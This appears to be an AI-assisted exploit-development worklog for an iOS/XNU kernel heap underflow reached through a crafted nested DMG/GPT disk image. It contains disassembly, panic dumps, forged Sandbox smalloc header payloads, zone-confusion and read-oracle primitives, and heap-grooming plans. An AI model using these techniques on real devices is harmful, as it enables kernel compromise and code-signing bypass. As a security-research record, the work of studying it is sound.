decoder is not blind to the shape — the sibling genuinely lacks it.

**Why:** it allocates an EXACTLY-SIZED buffer for the compressed bytes and reads
into the BASE, not into bufEnd-L:
    0xdcba24 ldr x25,[sp,#0x28]  x25 = compressedLength (raw, unvalidated)
    0xdcba40 bl IOMalloc         IOMalloc(compressedLength)
    0xdcba54 bl IOMalloc         IOMalloc(sectorCount*512)
    0xdcba88 mov x4, x27         dst = buffer BASE
    0xdcba90 blr x8              backingStore->read(...)  EXACT FIT
It is the correctly-written sibling of read(). Only 3 comparisons in the whole
function; it never touches the cache (15 BL + 3 BLR, zero cache calls, zero
accesses at offset 0xc0), and frees everything it allocates in the same call.

### R78.2 — It is vtable slot +0x590, and read() dispatches it on the BACKING STORE

Whole-file qword scan (3,118,244 qwords, asserted) found exactly one pointer to
each: read at 0xfffffff00752d780 (+0x588, index 177), sibling at
0xfffffff00752d788 (**+0x590, index 178**), chunk_lookup at +0x5c8 (185).
Vtable base 0xfffffff00752d1f8, 186 slots. read() calls
`[backingStore->vtable + 0x590]` at three sites (0xdcb558, 0xdcb68c, 0xdcb774)
on this->0x90. **So the sibling runs whenever an attached UDIF's backing store
is itself a KDIUDIFDiskImage — i.e. a NESTED DMG.** (slot arithmetic HIGH;
"nested DMG is the practical trigger" MEDIUM — the attach path populates
this+0x90 and was not traced.)

### R78.3 — Why we want it: a BYTE-GRANULAR controlled allocation

`IOMalloc(compressedLength)` is an unvalidated u64 straight out of the BLKX
chunk entry, paired with an IOFree of the same size in the same call, with no
cache interaction to perturb it. Every knob in read() is coarse — victim and
cache buffers 512-granular, merged table 40-granular, blkx array 8-granular.
**This one is 1-byte granular and hits any zone at an exact size, once per
chunk, in chunk order, as many times as we like.** If nested images are
reachable, this is how we build the layout; then we take the underflow in read().
=> Do NOT switch the victim. Add this as the grooming engine.

### R80.3 — The code: an UNCHECKED 32-bit free-list index, stride 24

    0xfffffff00764ca8c  stp  x24,x23,[sp,#-0x40]!     ; function entry
    0xfffffff00764caa0  ldp  w8,w9,[x0,#0x14]         ; size / free watermark
    0xfffffff00764caa8  lsl  w10,w8,#3
    0xfffffff00764caac  sub  w8,w10,w8                ; w8 = size*7
    0xfffffff00764cab0  cmp  w9,w8,lsr #3             ; the 7/8 grow watermark
    0xfffffff00764cab4  b.hi ...                      ; (checks FREE COUNT, not the index)
    0xfffffff00764cab8  ldr  x8,[x0,#0x20]            ; x8 = space->is_table
    0xfffffff00764cabc  ldr  w21,[x8,#0x10]           ; w21 = table[0].ie_next  <<< OUR BYTES
    0xfffffff00764cac0  cbz  w21, ...                 ; ==0 -> KERN_NO_SPACE
    0xfffffff00764cacc  mov  w9,#0x18                 ; stride 0x18 = 24 = sizeof(ipc_entry)
    0xfffffff00764cad0  madd x22,x21,x9,x8            ; x22 = &table[first_free]
    0xfffffff00764cad4  mov  x23,x22
    0xfffffff00764cad8  ldr  w9,[x23,#0x10]!          ; <<< FAULT: entry->ie_next
    0xfffffff00764cadc  str  w9,[x8,#0x10]            ; table->ie_next = entry->ie_next
    0xfffffff00764cae0  ldr  w8,[x0,#0x1c]
    0xfffffff00764cae8  str  w8,[x0,#0x1c]            ; space->is_table_free--
    0xfffffff00764caf0  ldr  w10,[x24,#8]!            ; entry->ie_bits
    (then IE_BITS arithmetic: +0x4000000, &0xff000000, &0xc00000, udiv/msub)

Arithmetic verified against the register file to the bit:
    x8  = 0xfffffff07aeb1000  (table base, PAGE-ALIGNED)
    w21 = 0x5a000978
    x8 + w21*0x18 = 0xfffffff8eaebf340 == x22 reported          MATCH
    x22 + 0x10    = 0xfffffff8eaebf350 == far reported          MATCH

**Identification: the IPC entry free-list pop (`ipc_entry_get` / `ipc_entry_claim`
family, osfmk/ipc/ipc_entry.c).** Mechanics are VERIFIED; the function NAME is
inference, from three independent signs: the only caller (0xfffffff00765b460)
sits in a window whose string neighbourhood is entirely
`ipc_object_copyin_from_kernel` / `ipc_object_destroy` / `ipc_object_copyout`
assertions; stride 0x18 == sizeof(struct ipc_entry) on arm64; and the shape
`first_free = table->ie_next; entry = &table[first_free]; table->ie_next =
entry->ie_next; space->is_table_free--` is `ipc_entry_get` verbatim.

### R80.4 — Why this is much better than R79's pmap primitive

    pmap ASID (R79)   16-bit field, >>1, max index ~0x7ffe  -> ~32 KB reach
    ipc_entry (R80)   FULL 32-BIT index, x 24               -> 0x17ffffffe8 = 96 GiB

Achieved reach in this very panic: x22 - x8 = 0x87000e340 = **33.75 GiB** past the
table base, from one 4-byte field. And the IPC entry table is THE canonical
target: a controlled free-list head makes the next port allocation hand out a
"fake entry" at an address of our choosing, whose `ie_object` (+0x00) then gets a
real `ipc_port_t` written into it. That is the standard route to a fake port and
from there to read/write - and the write of a kernel pointer into a location we
choose is also the info leak we have been missing.

Note also `str w9,[x8,#0x10]` immediately after the faulting load: on a MAPPED
read this is **a 32-bit read from an address we choose, stored into the
free-list head** - i.e. a read primitive whose result becomes the next index.

### R80.5 — ONE THING DOES NOT ADD UP, AND I AM NOT PAPERING OVER IT

From the ruler, table+0x10 = V - 1672, so table = V - 1688 = V - 0x698.
x8 (table) is PAGE-ALIGNED (0xfffffff07aeb1000). Therefore V = table + 0x698,
which is 8-aligned but **NOT 8192-aligned**. A kalloc.8192 exact-fit element
should sit on an 8192 boundary (A8 has 16 KB pages, so two 8192-elements tile
one page). Three candidate explanations, not yet distinguished:
  (a) allocSize was not 8192 - i.e. dbr was not consumed as 16 and R75/R77.4's
      `allocSize = dbr<<9` model is wrong somewhere;
  (b) the IPC table was allocated AFTER our write, into memory our write had
      already corrupted and that was then freed (the victim IS IOFree'd at
      0xfffffff007dcb718) - in which case 0x978 correctly measures our write's
      footprint but the 1672 B gap is allocation-order luck, not layout;
  (c) the victim went to kalloc.large / page-granular rather than a zone.
**Recipe E is designed to distinguish (a)/(c) from (b).**

**A voluntary `panic()` carries NO REGISTER DUMP.** XNU emits the full register
file only for exception panics ("Kernel data abort", "Invalid kernel stack
pointer"). I confirmed it directly: the record has zero occurrences of `x0:`,

assertion panic the payload must carry its information in a value the panic's

### R81.3 — Sandbox has its OWN heap allocator, and our write reaches it

Both AMFI and Sandbox ship an `smalloc`/`sfree` with the same assertion text:

    0xfffffff0072ed83d  Sandbox-1217.140.4/src/kext/smalloc.c:266   <- this one fired
Sandbox's `sfree` (0xfffffff0076fb1700-ish region; panic call at

    0xfffffff007fb170c  mov  w9,#0x6371
    0xfffffff007fb1710  movk w9,#0x4a61,lsl#16 ; w9 = 0x4A616371
    0xfffffff007fb1714  cmp  w8,w9             ; THE ONLY VALIDATION
    0xfffffff007fb1718  b.ne -> 0xfffffff007fb1764

    0xfffffff007fb1720  ldr  w19,[x0,#4]       ; SIZE    <- from the header

Header layout:
    +0x00 u32 magic  0x4A616371 live ("Jacq"; LE bytes 71 63 61 4a), 0x56696472 freed
    +0x04 u32 SIZE   -> passed verbatim to IOFree
    +0x08 u64 OWNER  -> if non-NULL, [OWNER+0x38] gets an atomic subtract
    +0x10            the pointer sfree() receives

### R81.4 — TWO PRIMITIVES from 16 bytes, and the magic is a FIXED CONSTANT

Decoded from the MOVZ/MOVK encodings, not guessed: 0x4A616371 and 0x56696472 are
immediates baked into the code. **There is no per-boot cookie to leak.**

 (1) **IOFree(ptr, OUR_SIZE) -> the chunk is returned to the WRONG ZONE.**
     Classic zone confusion: a small chunk freed into a large zone's free list
     yields overlapping allocations and from there general heap control.
     **This needs NO address knowledge and NO KASLR leak** - which is exactly
     the wall R77/R79 kept hitting. This is the most promising primitive found
     in the entire session.
 (2) **Atomic subtract of a controlled amount at [OUR_PTR + 0x38]** - an
     arbitrary-address read-modify-write. Needs an address, so it is for later.

This also answers the AMFI agent's recommended next question (its §6.4, "whether
the compiled Sandbox platform profile is heap-resident") EMPIRICALLY: Sandbox
kext heap memory is within reach of this write. And per R45.3, Sandbox's
`process-exec-interpreter` (op 102, unconditional DENY) is the real gate, not
AMFI - so this is the right subsystem to be inside. Panicking task `xpcproxy`
(pid 51) is the exec trampoline, i.e. we are landing in the exec path itself.

### R81.5 — RECIPE F, armed by job 670, CHECKPOINT PASSED

No need to know WHERE a header is: **tile the entire reach with a forged one.**
Repeating 16 bytes, at file offset k:
    [k+0]  u32 0x4A616371        magic
    [k+4]  u32 0x00001000        SIZE = 4096, a legal kalloc size
    [k+8]  u32 0x4A616371        magic again - so an 8-SHIFTED read is ALSO valid
    [k+12] u32 0x005A0000 | k    carries the offset
first 32 bytes: 7163614a 00100000 7163614a 00005a00 7163614a 00100000 7163614a 10005a00

Both alignments present a valid magic, and each recovers the offset by a
different channel - deliberate, given R81.2:
  * 16-ALIGNED: size = 0x1000 -> IOFree succeeds (ZONE CONFUSION), owner =
    0x005A0100_4A616371 non-NULL -> atomic subtract at owner+0x38 -> DATA ABORT
    -> registers, and far's HIGH 32 bits carry 0x5A0000|offset.  [REGISTER channel]
  * 8-SHIFTED: size = 0x005A0000|k -> huge -> kfree panics and PRINTS the size,
    whose low bits give the offset.                              [TEXT channel]

    P1 data abort, far high bits = 0x5A00XX -> magic forgery WORKED, size and
       owner both under control, and a wrong-size IOFree already executed.
    P2 kfree panic naming a size 0x5A00XX   -> forgery worked, 8-shifted, offset
       recovered from the text.
    P3 "sfree on invalid allocation" again  -> the magic did NOT land; alignment
       or the header is not inside our footprint.
    P4 "double free"/smalloc.c:264          -> we hit an ALREADY-FREED header
       (magic 0x56696472), i.e. our bytes did not overwrite that word.
    P5 no panic in 7 min                    -> the forged free succeeded quietly;

    panic(cpu 0 caller 0xfffffff017051b78): Kernel data abort.
      at pc 0xfffffff017050048, lr 0xfffffff016bb1f7c
    Kernel slide 0x000000000f400000 (text base - slide = 0xfffffff007004000, 4th time)
    esr 0x96000004 -> data abort, DFSC 0b000100 = translation fault LEVEL 0
                      (nothing mapped at all), WnR=0 = READ
    x0  = 0x000010004a616371
    x24 = 0x000010004a616371
    far = 0x000010004a616371     <<< EXACTLY our forged tile qword

Our Recipe F tile is `71 63 61 4a | 00 10 00 00 | ...`, i.e. the qword at a
16-aligned offset is `0x00001000_4A616371` = (size 0x1000) << 32 | magic.
**far is that value verbatim. Both halves are ours.** This is a fully controlled
64-bit pointer dereference — not "a crash near our write", the faulting address
IS the bytes we authored.

### R82.2 — What consumed it: strncmp() on a hash/list entry's KEY POINTER

Call site, function 0xfffffff0077b1cfc (12 callers), loop at +0x25c:

    0xfffffff0077b1f34  ldr  x10,[x26,#0xa20]
    0xfffffff0077b1f38  add  x26,x10,w8,uxtw #3    ; bucket = base + idx*8
    0xfffffff0077b1f4c  bl   0xfffffff0077933e8    ; lock
    0xfffffff0077b1f50  ldr  x22,[x26]             ; bucket head
    0xfffffff0077b1f60  ldr  x22,[x22]             ; entry = entry->next   (+0x00)
    0xfffffff0077b1f64  cbz  x22, done
    0xfffffff0077b1f68  ldr  x24,[x22,#0x10]       ; KEY POINTER  <<< OUR QWORD
    0xfffffff0077b1f74  mov  x2, x23               ; len = 0x1f = 31
    0xfffffff0077b1f78  bl   0xfffffff007c50030    ; strncmp(key, probe, 31)
    0xfffffff0077b1f7c  cbnz w0, loop              ; mismatch -> next entry
    0xfffffff0077b1f80  ldrb w8,[x24,x23]          ; key[31] == 0 ?
    0xfffffff0077b1f88  ldr  w8,[x22,#0x18]        ; refcount++
                        str  w8,[x22,#0x18]

0xfffffff007c50030 IS strncmp (VERIFIED by disassembly: byte-at-a-time
`ldrb w4,[x0],#1 / ldrb w5,[x1],#1 / subs x3,x4,x5 / ccmp w4,#0,#4,eq`, with an
aligned fast path behind `tst x0,#0xf`). The faulting pc 0xfffffff007c50048 is
its FIRST byte load from x0 — the unaligned slow path, taken because our pointer
is not 16-aligned.

Entry layout recovered: **+0x00 next, +0x10 key pointer, +0x18 refcount.**

=> **PRIMITIVE #4: a controlled pointer handed to strncmp against a known
31-byte comparand, with the match result steering control flow (next-entry vs
refcount++ and return).** That is the classic byte-at-a-time comparison oracle
for reading kernel memory, and it is a READ path, so it does not destroy what it
measures. It needs an output channel to be useful, but it is a genuine read
oracle and it is reachable from a disk image.

### R82.3 — TWO CORRECTIONS TO MY OWN TOOLING (both mine, both caught here)

  1. **I claimed 0xfffffff007c4xxxx-c5xxxx were "runtime-populated thunks" that
     cannot be disassembled. THAT WAS WRONG.** Those pages carry ~440 nonzero
     bytes per 0x200 in the file; only the specific 8 bytes I happened to
     disassemble were zero (they are padding between functions). Retracted.
     The region is ordinary code — it is where strncmp/memcmp/bcopy live.
  2. **My v2o() used __DATA's VMSIZE where it must use FILESIZE.**
         __DATA  vmaddr 0xfffffff008644000  vmsize 0x1b0000  FILESIZE 0xec000
     so __DATA's file content ENDS at vm **0xfffffff008730000**; above that it is
     zerofill, and my mapper was happily returning offsets that actually land in
     __BOOTDATA / __PRELINK_INFO. That is how a supposed "lock array" at
     0xfffffff00875b640 came back as plist text.
     **Scope of the damage, checked:** the only affected read was that one bogus
     string. R74's trust-cache head (0xfffffff0087cb2a8) and pmap_zone
     (0xfffffff0087cb2a0) were identified via the SECTION table as
     __DATA.__bss S_ZEROFILL with sect_fileoff=0 — correct, and unaffected.
     R75's k_zone_cfg (0xfffffff0074a4810) and R77's static-TC pointer
     (0xfffffff0074ab510) are both in __DATA_CONST, where filesize == vmsize.
     **No earlier finding changes.** Rule: bound every VA->offset map by
     FILESIZE, and treat [fileoff+filesize, vmaddr+vmsize) as zerofill.

### R82.4 — Why the ruler STILL did not read out, and the fix

The dereferenced qword was the (magic, size) pair at tile+0, which carries no
offset — the offset lived at tile+12, in the OTHER qword. So the register channel
fired but had nothing to say.
**Fix for the next recipe: make EVERY qword carry the offset.**
    [k+0]  u32 0x4A616371                  magic
    [k+4]  u32 0x00001000 | (k>>4)         plausible size (0x1000..0x1400) AND k/16
    [k+8]  u32 0x4A616371                  magic (keeps 8-shift tolerance)
    [k+12] u32 0x005A0000 | k              k directly
  qword@k+0 = (0x1000|(k>>4))<<32 | magic  -> far high32 & 0xFFF, <<4 = k
  qword@k+8 = (0x5A0000|k)<<32   | magic  -> far high32 & 0xFFFF   = k
Every 8-aligned qword in the payload is then both a valid-magic smalloc header
AND self-locating.

### R83.2 — ZONE CONFUSION FIRED, AND XNU CAUGHT IT. R81 primitive (1) is DEAD.

Boot 672's panic IS our smalloc forgery working end to end:
    "Element 0xfffffff062862400 from zone kalloc.160 caught being freed to
     wrong zone %s"
The magic was accepted, our SIZE was used, IOFree routed the chunk to the zone
for size 0x1000-0x1400 (kalloc.4096/6144) while the element truly belonged to
**kalloc.160**, and the allocator refused.

The detector, VERIFIED (xref to the format string at 0xfffffff0072278b0 is
unique, at 0xfffffff0076d2f80):

    0xfffffff0076d2f5c  ldrh w8,[x8,#0x16]    ; PAGE METADATA -> zone index
    0xfffffff0076d2f60  and  x8,x8,#0x3ff     ; 10-bit index
    0xfffffff0076d2f64  mov  w9,#0x140        ; sizeof(struct zone) = 320
    0xfffffff0076d2f68  madd x8,x8,x9,x10     ; &zone_array[idx]
    0xfffffff0076d2f6c  ldr  x8,[x8,#0x120]   ; element's TRUE zone name
    0xfffffff0076d2f70  ldr  x9,[x20,#0x120]  ; TARGET zone name
    0xfffffff0076d2f84  bl   panic(...)
Boot 672's `caller` 0xfffffff0182d2f88 - slide 0x10c00000 = 0xfffffff0076d2f88,
the instruction right after that `bl`. Site confirmed from the device, not argued.

**The element's true zone is read from PAGE METADATA, which our write cannot
reach. No payload content can satisfy the check.** And the other direction is
closed too: an oversized free hits
`"kfree: size %lu > kalloc_largest_allocated %lu"` (0xfffffff007224623).
The only wrong size that passes is one that maps to the SAME zone — i.e. no gain.

## R84 — RECIPE G: measure the one number that bounds everything —
## HOW MANY TIMES DOES THE WRITE FIRE PER BOOT?

R83 left us with four primitives and no aim, and named grooming as the next
phase. But grooming presupposes something we have never measured: **whether the
parse path runs more than once per boot.** Every recipe so far poisoned sector 0
and we observed exactly one panic, which is consistent with BOTH "one read per
boot" and "many reads, the first one fatal". Those two worlds need completely
different strategies:
  * one read per boot  -> one blind shot, grooming is near-impossible, and the
    delivery itself (hdik at UserEventAgent, fired once at boot) has to change.
  * several reads       -> we get repeated writes AND a spray in a single boot,
    which is R75's K3 answered without needing the block cache to exist.
So this is measured before anything else is designed on top of it.

### R84.1 — Design: sector 0 is deliberately HARMLESS

    run[ 0] ignore 0x02       sector 0    +16     <- BENIGN. attaching and
                                                     reading sector 0 writes NOTHING
    run[ 1] zlib  0x80000005  sector 16   +15  compOff 0x00000 compLen 0x3000  tag 0x5B
    run[ 3] zlib              sector 32   +15  compOff 0x03000                 tag 0x5C
    run[ 5] zlib              sector 48   +15  compOff 0x06000                 tag 0x5D
    run[ 7] zlib              sector 64   +15  compOff 0x09000                 tag 0x5E
    run[ 9] zlib              sector 80   +15  compOff 0x0C000                 tag 0x5F
    run[11] zlib              sector 96   +15  compOff 0x0F000                 tag 0x60
    run[13] zlib              sector 112  +15  compOff 0x12000                 tag 0x61
    (single-sector ignore runs between them; run[15] ignore to 8192;
     run[16] terminator. runCount = 17 -> merged table 924 B -> zone 1024,
     deliberately NOT the victim's zone 8192.)
    dbr = 16 -> allocSize 8192 (zone 8192, caching=0, exact fit) as before.
    L = 0x3000 for every probe -> each reaches 4096 B below ITS OWN victim.
    data fork = 7 x 0x3000 = 86,016 B; file total 88,333 B.

Payload, per 16 bytes within chunk region of tag T, at region offset k:
    [k+0]  0x4A616371            Sandbox smalloc magic (keeps R81/R82 in play)
    [k+4]  0x00001000|(k>>4)     plausible size, carries k/16
    [k+8]  0x4A616371            magic again (8-shift tolerance, R82.4)
    [k+12] (T<<24)|k             TAG + offset
chunk 0 first 16 B: 7163614a 00100000 7163614a 0000005b
chunk 1 first 16 B: 7163614a 00100000 7163614a 0000005c

**Tag 0x5A is deliberately UNUSED** so it cannot be confused with the Recipe
D/E/F ruler in a stale log.

### R84.2 — Why this is decisive whichever way it goes

Any panic register (or printed size) of the form 0xTTxxxxxx names BOTH the chunk
and the byte offset inside it:
    tag 0x5B -> the reader reached sector 16
    0x5C -> 32 ; 0x5D -> 48 ; 0x5E -> 64 ; 0x5F -> 80 ; 0x60 -> 96 ; 0x61 -> 112
    P1 highest tag seen = 0x5B      -> reads go a little past sector 15
    P2 a high tag (0x60/0x61)       -> the reader sweeps the device; we have
                                       MULTIPLE WRITES PER BOOT and therefore a
                                       spray. Biggest possible win here.
    P3 several tags in one panic     -> several writes landed before the fatal one
    P4 **NO PANIC in 7 minutes**     -> the reader touches ONLY sector 0-15.
                                       That is a REAL RESULT, not a null: it
                                       means one blind shot per boot, grooming
                                       via repeated reads is off the table, and
                                       the next work item is the DELIVERY
                                       (forcing reads, or a different trigger)
                                       rather than the payload.
    P5 tag 0x5A anywhere             -> stale log, ignore.
**A quiet boot is the informative outcome here, so it must be allowed to run the
full 7 minutes before DFU.** This is the first recipe where silence is a
measurement rather than a miss.

## R85 — THE WRITE FIRES EXACTLY ONCE PER BOOT, AT SECTOR 0 ONLY.
## Read-based grooming is OFF THE TABLE. (decisive negative, R84's P4)

Recipe G booted (job 673 armed). the author: **"Ran almost 8 minutes with no observable
crash."** Sector 0-15 was the BENIGN `ignore` run; all seven poisoned chunks sat
at sectors 16, 32, 48, 64, 80, 96, 112 with tags 0x5B..0x61. **Not one fired.**

    => the reader touches ONLY sectors 0-15, i.e. exactly the first 8,192 bytes,
       which is precisely one victim-sized request (allocSize = dbr<<9 = 8192).
    => ONE write per boot, at sector 0. Nothing beyond is ever read.

Two corollaries, both load-bearing:

  * **R75's K3 (block-cache spray) and K4 (forced purge) are UNREACHABLE via
    repeated reads.** They depend on many chunk reads per attach; there is one.
    The block cache's existence (R75.5, left open as "a hardware question")
    is now MOOT for grooming purposes - one read cannot populate or grow it.
  * **The sector-0 write is what was killing the pod.** Remove it and the pod
    boots normally and stays up ~8 minutes. Every boot loop from R79 onward was
    our own write, not a side effect of the hdik substitution or the re-snapshot.
    That also means the harness is clean and we can run non-fatal experiments.

### R85.1 — SYNTHESIS with the parallel app-session's WORKNOTES (15:45-15:52)

That session (no pod access, offline only) independently reached conclusions
that dovetail with this, and one of them removes a shortcut I had been leaving
open:

  * **[their §2, verified] Heap addresses are NOT derivable from the kernel
    slide.** Measured across all 7 panic records: the panicked-task-to-text_base
    offset spreads over ~0x38 million bytes with no correlation to the slide
    (slide 0x0ac00000 gives the highest offset, 0x0ae00000 the lowest). So an
    absolute-address payload genuinely needs a runtime leak; there is no offline
    substitute. Their corollary is the useful half and I agree with it: **every
    primitive we hold is RELATIVE (an index or offset read out of a corrupted
    field), and a relative primitive needs ADJACENCY, not an address.** Aim
    before leak - the branch R83.1 already chose.
    (Their run also re-confirms `text_base - slide == 0xfffffff007004000` for a
    5th, 6th and 7th time.)

  * **[their §3] Their grooming engine SURVIVES my negative, and is better than
    the one I lost.** They propose using `ubc_cs_reconstitute_code_signature`
    (R77.1) as a chosen-size, chosen-content allocator: `0x14 + ntohl(cd->length)`
    through ordinary kalloc, CD `memcpy`'d verbatim, and `cd->length` is a field
    in a Mach-O **on the filesystem we control**. So heap layout is shaped by
    WHICH BINARIES EXEC AT BOOT and in what order - **not** by repeated reads.
    R85 kills read-based grooming; it does not touch exec-based grooming.
    **These are compatible: one write per boot is sufficient if the layout is
    arranged before hdik runs.** hdik is launched by launchd from the signed MRM
    cache, so everything that execs earlier is grooming we author.
  * **[their §3, the part I think is the strongest idea so far] The write can be
    SELF-CONSISTENT.** If the object below the victim is a CD buffer whose exact
    bytes we authored, our write can be *a correct copy of that buffer with one
    hash slot changed* - collateral damage zero, no panic. That directly answers
    the thing that has made every boot since R79 fatal, and it is why R85's
    "the pod survives when we don't write" matters: a non-fatal write is
    reachable.
  * **[their §4] The `mrm.plist.sig` question is bigger than the kernel bug.**
    If that signature is not actually verified, we get arbitrary `Program` AND
    `ProgramArguments`, which dissolves the R3.3/R66.1 argv constraint outright.
    Agreed on the priority ordering; that is checkable entirely offline.

Their five agents (LAUNCHD-CACHE, CSBLOB-LIFECYCLE, AMFI-FOREIGN, GROOM-ORDER,
CONFIG-HOSTS) are all offline questions, so they cost no pod time and do not
block this session. **Division of labour from here: they settle the offline
assumptions; this session owns the pod and the write envelope.**

### R85.2 — What this session does next, and why

With one write per boot and no leak, the binding constraint on everything is:
**how far below the victim can we write without killing the pod?** Every boot
from R79 to R82 used a 4096-byte reach and every one was fatal, so we have
never observed a surviving write. We cannot iterate on aim until we can land a
write and still have a running system to observe.

So: a REACH LADDER, one point per boot (one write per boot makes a ladder the
only option). **Recipe H = L = allocSize + 256**, i.e. the write covers
[V-256, V+8192): 8192 bytes harmlessly into the victim itself, and only **256
bytes** of collateral below it. Payload keeps the forged smalloc magic and the
self-locating word, so a crash still tells us where.
    P1 survives 7 min -> the 256 B below the victim are free or tolerant, and
       we have a usable write window for the app-session's self-consistent
       payload. Then ladder upward: 512, 1024, 2048.
    P2 crashes        -> the region directly below is live and hot even at 256 B;
       the self-consistent-copy approach becomes mandatory rather than optional,
       and the ladder goes DOWN (128, 64, 16).
Either way we learn the envelope, and unlike R79-R82 a quiet boot is now a
meaningful result rather than a miss.

### R86.3 — Why the ladder stops here

A survivable window would have to be < 88 bytes, and a 64-byte write below a
RANDOM neighbour is worth nothing: there is no useful field we can place there
and no target we can choose. Laddering down would only buy a "non-fatal write"
with no exploit value. **Abandoning the ladder.** The gradient in R86.1 is the
useful residue: damage is proportional to reach, so once the neighbour is OURS a
large reach becomes safe rather than more dangerous.

merged BLKX table is allocated ONCE AT ATTACH (A2, 0xfffffff007dcbfb4), before
any read, so one read per boot is sufficient. R75 recorded K1 as the most
interesting knob and it is still fully alive. I had wrongly lumped it in with
the grooming I lost.

    table slack     =  8192 - 7044 = 1,148 B of unused element tail

Allocation order within one attach+read is known (R75.3): A1 blkx pointer array,

**If the allocator gives the victim the element directly ABOVE the table, our
write [V-256, V) lands at [T+7936, T+8192) - entirely inside the table's
1,148-byte SLACK, past the end of its real data. Completely harmless.**

    Kernel slide 0x0000000001200000 (text base - slide = 0xfffffff007004000, 8th time)
    Panicked task pid 0: kernel_task, tid 1608
    (preceded by "Attempting to forcibly halt cpu 0" / "cpu 0 failed to halt
     with error -5" / "Debugger synchronization timed out")

**The 64-bit word at 0xfffffff07eef7040 is `0x0000_1004_4A61_6371`:**
    low  32 = 0x4A616371  -> the Sandbox smalloc live magic WE authored
    high 32 = 0x00001004  -> the tile's size field = base|(k>>4), k>>4 = 4, k = 0x40

**Chunk attribution is unambiguous**: Recipe J's two poisoned chunks use
different size-field bases - chunk A (sector 64) uses base **0x1000**, chunk B
(sector 8191) uses base **0x1400**. Verified by reading the image back:
    chunk A k=0x40 -> qword 0x000010044a616371   <-- EXACTLY the observed value
    chunk B k=0x40 -> qword 0x000014044a616371
So the bytes came from **chunk A, at sector 64, tile offset 0x40**.

**Sector 64 is reachable ONLY via READ #2**: it is `PartitionEntryLBA` from our
GPT header, and the GUID scheme issues that read only after
`0xfffffff007cd66f4 cmp w0,w25 / b.ne` accepts our header CRC-32. The sector-0
RAW chunk (type 1) allocates no victim and performs no underflow write at all.
**=> THE SECOND READ HAPPENED, AT AN OFFSET WE CHOSE.**

### R87.2 — What this overturns

**R85 is now scoped, not wrong.** Its measurement stands exactly as taken: with
an UNRECOGNISABLE disk, the reader touches only sectors 0-15 and there is one
write per boot. But the cause was our bait - every image this project ever built
put tile bytes, a 0xCC header or zero-fill at sector 0, so no partition scheme
had a reason to read on. Present a valid protective MBR plus a CRC-correct GPT
primary header and the GUID scheme reads on, at `PartitionEntryLBA * blockSize`
for `NumberOfEntries * SizeOfEntry` bytes - **both fields ours**.

Consequences, in order of value:
  1. **Read-based grooming is NOT dead.** R85's corollary that K3/K4 are
     unreachable must be revisited: more than one read per attach is achievable.
  2. **We choose the read OFFSET and LENGTH.** `PartitionEntryLBA` (hdr+0x48)
     and `NumberOfEntries`/`SizeOfEntry` (hdr+0x50/0x54) are attacker fields
     behind a checksum we compute offline. Each additional read is another
     underflow write from the same site.
  3. **The app-session's §6 "scan at a fixed victim" is back on the table** -
     the victim is IOFree'd inside the same `read()` (verified independently by
     them at 0xfffffff007dcb718), so if zone 8192's free list is LIFO each
     subsequent read reuses the same element. Several writes, one fixed origin,
     a different `compressedLength` each: an aiming instrument instead of a
     blind shot. (LIFO still unverified - their GROOM-ORDER agent owns it.)
  4. the author's two sequential crashes are consistent with more than one write
     landing before the machine gave up.

### R87.3 — The value arrived through the TEXT channel, as designed

My binary scan of the panic record for the magic qword and for the top-byte tags
returned **zero** hits. The value reached us only inside the panic's FORMAT
STRING ("= 10044a616371"), because a `panic()` assertion emits no register dump
(R81.2). The app-session's tile was built to satisfy exactly that channel, and
that is why this boot produced a readable answer where Recipes E and I did not.
**Rule: payloads must carry their identity in values a panic format string
prints, not only in values a register dump would show.**

### R87.4 — A fifth consumer, and a method note

The corrupted word was a **spinlock**: our qword sat in the lock at
0xfffffff07eef7040, so the lock could never be observed free, every waiter spun,
and the spinlock-timeout watchdog fired on the other CPU. Not a useful primitive
(it is a denial of service, not a control transfer) but it is a fifth independent
demonstration that our bytes are consumed as live kernel data - after pmap ASID
(R79), ipc_entry index (R80), smalloc header (R81), strncmp key pointer (R82/R86).

Method note: **`AppleExternalAmpController::receiveError` / amp overflow and
underrun spam in the UART log is RAMDISK NOISE and a red herring** (the author, direct).
Do not read it as a crash signature. Also: this device does not emit kernel panic
text over UART at all - the 3.8 MB screenlog contains iBoot output, launchd
notices and `panic flow Config Engine Trigger NOT found` (an iBoot/SEP message,
not a kernel panic), with zero occurrences of "Kernel slide" or "xnu". The panic
partition remains the only source for kernel panics.

### R87.5 — Next

The question that now gates everything is whether we can get MANY reads, with
chosen offsets, in one attach - i.e. whether the GPT path can be made to issue
several reads, or whether a declared partition publishes a child IOMedia whose
own probe reads again at parent offsets we choose (the app-session raised this in
§10 and it is now worth pursuing). Combined with a LIFO fixed victim, that is the
aiming instrument. Recipe K should chase read count, not a new primitive.

  * **Foreign-binary acceptance is dead** (§17.1): trust-cache membership is the

  * **Their own §3 CD-buffer plan is half dead** (§17.2): page taint is sticky
    (`0xfffffff007709464 tst w8,#0xc0000 / b.ne` — they found the real address

### R88.2 — AIM IS SOLVED ON PAPER (their §17.3), and it retires our stated blocker

R83 called the blocker "aim, plus no info leak". Their GROOM-ORDER result says
the question was wrong:
  * `zcram` carves a chunk taking either the lowest- or highest-remaining element
    per step **on a random bit**, and the free list is per-chunk LIFO. **So
    allocate-X-then-Y never implies Y is above X.** Our four-boots-four-victims
    observation was the designed behaviour, not bad luck.
  * **But order was never needed.** Own every element of one chunk except one and
    the victim deterministically takes the remaining slot, because
    `try_alloc_from_zone` drains `pages.intermediate` first. Lower neighbour is
    ours with probability (N-1)/N.
  * N per chunk: **2048 -> N=8 (87.5%)**, 6144 -> 5, 4096 -> 4, 8192 -> **N=2**,
    16384/32768 -> **N=1 (same-size grooming impossible)**. Zones 16..512 and
    1024 are per-CPU cached with no boot-arg to disable -> permanently unaimable.
    **=> every recipe we have run used zone 8192 (N=2) or zcache zones. Zone 2048
    is the right target and we have never used it.**
  * **Live elements carry NO canary** (first/last 8 bytes are 0xdeadbeefdeadbeef,
    written at alloc, never re-read). All validation is on the free->alloc
    transition. **A FREE neighbour panics** (its last 8 bytes hold
    `old_head ^ cookie`, which a downward write destroys first); **a LIVE
    neighbour is quiet.** So groom objects must be live, and freeing them is
    doubly wrong. This also reframes every crash we have had.

**And it dissolves R80.5/R86's open anomaly**: `kalloc.8192`'s chunk is one 16 KB
page holding exactly two elements, so the lower element's base is necessarily
page-aligned and **no zone element can start at page+1672** (1672 = 2^3*11*19).
1672 was a distance to a damaged FIELD, never to a base. Our model was right and
the "does not add up" I flagged in R80.5 is now accounted for. Closing that item.

### R88.3 — Useful safety facts they established

